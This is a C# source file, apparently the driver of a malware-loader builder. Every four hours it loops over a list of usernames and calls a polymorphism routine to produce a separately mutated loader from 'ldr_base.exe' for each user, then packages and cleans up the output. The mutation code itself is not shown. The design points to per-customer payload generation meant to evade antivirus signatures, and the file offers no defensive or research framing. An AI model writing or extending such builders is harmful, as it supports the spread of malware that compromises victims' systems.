using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;

namespace create_loaders
{
    class Program
    {
        const string loader_base = "ldr_base.exe";
        private const int max_threads = 2;
        static void Main(string[] args)
        {
            Thread t1 = new Thread(() => do_work(0));
            t1.Start();
            //Thread t2 = new Thread(() => do_work(1));
            //t2.Start();
        }

        static void do_work(int thread_number)
        {
            while (true)
            {
                var total_usernames = utils.get_usernames();
                //var usernames = total_usernames.Take(total_usernames.Length / 2).ToArray();
                //if (thread_number == 1)
                 //usernames = total_usernames.Skip(total_usernames.Length / 2).ToArray();

                foreach (var current_username in total_usernames)
                {
                    if (current_username.Trim().Length == 0)
                        continue;

                    do_polymorph.main_poly(current_username, thread_number);
                    Console.Write("[{1}]done with loader for {0} - [tn: {2}]\n", current_username, DateTime.Now.ToString(), thread_number);
                    utils.clean_directory(current_username); //delete other random stuff
                    File.Delete("output.rar");
                }

                Console.WriteLine("finished 1 loop of creating loaders.");
                Console.WriteLine("sleeping for 4h.");
                Thread.Sleep(TimeSpan.FromHours(4));
            }
        }
    }
}
